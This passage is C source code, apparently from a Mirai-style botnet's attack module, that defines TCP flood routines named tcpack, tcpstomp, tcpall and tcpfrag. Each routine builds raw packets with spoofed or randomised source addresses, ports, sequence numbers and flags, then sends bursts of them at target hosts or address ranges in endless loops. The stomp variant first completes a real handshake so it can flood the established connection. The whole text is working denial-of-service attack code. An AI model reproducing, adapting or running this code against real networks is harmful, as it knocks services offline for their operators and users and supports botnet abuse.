            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            const int burst = 16;
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            targs[i].sock_addr.sin_port = tcph->dest;
            for (int b = 0; b < burst; b++)
            {
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
            }
        }
    }
}
void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;
        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = rand_next() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;
        rand_str(payload, data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            targs[i].sock_addr.sin_port = tcph->dest;
            {
                const int burst = 16;
                for (int b = 0; b < burst; b++)
                {
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
                }
            }
        }
    }
}
void attack_method_tcpstomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(rfd);
        return;
    }
    {
        int sndbuf = 4 * 1024 * 1024;
        setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(rfd, F_SETFL, O_NONBLOCK | fcntl(rfd, F_GETFL, 0));
    }
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;
        stomp_setup_nums:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
            continue;
        }
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);
        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));
                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;
                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);
                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;
                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;
                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }
            if (time(NULL) - start_recv > 10)
            {
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            const int burst = 8;
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            targs[i].sock_addr.sin_port = tcph->dest;
            for (int b = 0; b < burst; b++)
            {
                if (ip_ident == 0xffff)
                    iph->id = rand_next() & 0xffff;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
            }
        }
    }
}
void attack_method_tcpall(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, TRUE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, TRUE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            targs[i].sock_addr.sin_port = tcph->dest;
            {
                const int burst = 16;
                for (int b = 0; b < burst; b++)
                {
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
                }
            }
        }
    }
}
void attack_method_tcpfrag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, TRUE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, TRUE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            targs[i].sock_addr.sin_port = tcph->dest;
            {
                const int burst = 16;
                for (int b = 0; b < burst; b++)
                {
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
                }
            }
        }
    }
}
